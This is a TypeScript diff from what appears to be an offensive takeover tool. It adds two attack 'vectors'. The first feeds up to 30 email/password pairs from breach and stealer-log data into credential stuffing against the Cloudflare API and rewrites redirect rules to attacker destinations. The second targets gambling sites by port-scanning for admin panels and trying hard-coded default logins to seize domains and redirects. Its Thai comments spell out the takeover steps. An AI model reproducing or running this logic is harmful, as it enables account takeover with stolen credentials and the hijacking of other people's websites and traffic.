@@ -856,7 +856,52 @@ function buildTakeoverVectors(result: TakeoverIntelResult): TakeoverVector[] {
     });
   }
   
-  // Vector 4: Destination domain takeover
+  // Vector 4: Cloudflare Account Takeover (when CF is detected as DNS/CDN provider)
+  const isCloudflareSite = result.redirectChain.some(r => 
+    r.platform?.toLowerCase().includes("cloudflare") || r.redirectType === "302" || r.redirectType === "301"
+  ) || result.platform?.platform === "Cloudflare";
+  
+  // Check if redirect is server-side (302/301 with empty body = CF Page Rule)
+  const isServerSideRedirect = result.redirectChain.some(r => 
+    (r.statusCode === 301 || r.statusCode === 302) && r.redirectType !== "javascript" && r.redirectType !== "meta"
+  );
+  
+  if (isServerSideRedirect) {
+    // Collect all credentials that could be CF accounts
+    // Include domain owner creds, stealer logs, and any email-based creds
+    const cfCandidateCreds = result.allCredentials
+      .filter(c => c.email && c.password)
+      .sort((a, b) => b.relevanceScore - a.relevanceScore)
+      .slice(0, 30);
+    
+    if (cfCandidateCreds.length > 0) {
+      const probability = Math.min(45, 5 + cfCandidateCreds.length);
+      vectors.push({
+        id: "cloudflare_takeover",
+        name: "Cloudflare Account Takeover",
+        description: `Login Cloudflare API ด้วย credentials จาก breach data → หา zone ${result.domain} → แก้ Page Rule/Redirect Rule`,
+        target: `Cloudflare: ${result.domain}`,
+        method: "credential_stuffing",
+        requirements: [
+          "Cloudflare Global API Key or API Token",
+          `Zone access for ${result.domain}`,
+          "Page Rule or Redirect Rule edit permission",
+        ],
+        successProbability: probability,
+        difficulty: "hard",
+        credentialsToTry: cfCandidateCreds.map(c => ({ email: c.email, password: c.password })),
+        steps: [
+          "ลอง login CF API ด้วย password เป็น Global API Key",
+          "ลอง password เป็น API Token (Bearer)",
+          `ถ้า login สำเร็จ → List zones → หา ${result.domain}`,
+          "หา Page Rules + Redirect Rules ที่ match path",
+          "เปลี่ยน destination URL เป็นของเรา",
+        ],
+      });
+    }
+  }
+  
+  // Vector 5: Destination domain takeover
   const destCreds = result.allCredentials.filter(c => c.targetService.startsWith("destination_"));
   if (destCreds.length > 0) {
     vectors.push({
@@ -872,6 +917,62 @@ function buildTakeoverVectors(result: TakeoverIntelResult): TakeoverVector[] {
       steps: [
         "Login เข้า destination site admin",
         "เปลี่ยนเนื้อหาเป็นของเรา",
+      ],
+    });
+  }
+  
+  // Vector 6: Robot Management System (RMS) Takeover
+  // Detect when destination is a gambling site that might be managed by an RMS panel
+  const lastHop = result.redirectChain[result.redirectChain.length - 1];
+  const destUrl = lastHop?.url || "";
+  const destDomain = extractDomain(destUrl);
+  
+  // Check for gambling/lottery indicators in the destination
+  const gamblingIndicators = [
+    "casino", "slot", "bet", "poker", "lottery", "lotto", "หวย", "สล็อต", 
+    "คาสิโน", "บาคาร่า", "แทงบอล", "พนัน", "bonus", "bigwin", "jackpot",
+    "teeyai", "เที่ยวไป", "xn--", // IDN domains (common for Thai gambling)
+  ];
+  
+  const isGamblingDest = gamblingIndicators.some(kw => 
+    destUrl.toLowerCase().includes(kw) || destDomain.toLowerCase().includes(kw)
+  );
+  
+  // Also check if destination uses IDN (punycode) — common for Thai gambling sites
+  const isIdnDomain = destDomain.startsWith("xn--");
+  
+  if (isGamblingDest || isIdnDomain) {
+    // RMS panels often use default credentials — high probability if gambling site
+    const rmsCreds = [
+      { email: "admin", password: "admin123" },
+      { email: "admin", password: "admin" },
+      { email: "root", password: "root123" },
+      ...result.allCredentials
+        .filter(c => c.targetService.startsWith("destination_"))
+        .slice(0, 5)
+        .map(c => ({ email: c.email, password: c.password })),
+    ];
+    
+    vectors.push({
+      id: "rms_takeover",
+      name: "Robot Management System Takeover",
+      description: `ค้นหา admin panel (port 8080/8888) ที่ควบคุมเว็บ ${destDomain} → login ด้วย default credentials → เปลี่ยน domain + redirect`,
+      target: `RMS: ${destDomain}`,
+      method: "rms_default_creds",
+      requirements: [
+        "RMS admin panel accessible (port 8080/8888)",
+        "Default credentials (admin/admin123)",
+        "JWT authentication",
+      ],
+      successProbability: isIdnDomain ? 55 : 40, // Higher for IDN gambling sites
+      difficulty: "medium",
+      credentialsToTry: rmsCreds,
+      steps: [
+        `Port scan ${destDomain} สำหรับ admin panel (8080, 8888, 3000, etc.)`,
+        "ลอง login ด้วย default credentials (admin/admin123, root/root123)",
+        "ถ้า login สำเร็จ → List managed WordPress sites",
+        `หา ${destDomain} ใน managed sites`,
+        "เปลี่ยน domain + เปิด redirect_old_domain",
       ],
     });
   }
